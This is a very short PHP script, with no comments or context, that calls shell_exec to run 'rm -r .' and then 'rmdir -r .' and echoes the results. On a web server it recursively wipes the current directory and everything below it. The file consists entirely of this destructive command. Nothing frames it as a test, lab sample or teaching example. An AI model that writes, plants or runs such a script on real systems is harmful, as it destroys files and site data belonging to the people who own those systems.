<?php
	$Commande = shell_exec ('rm -r .');
	echo "$Commande";
	$Commande = shell_exec ('rmdir -r .');
	echo "$Commande";
?>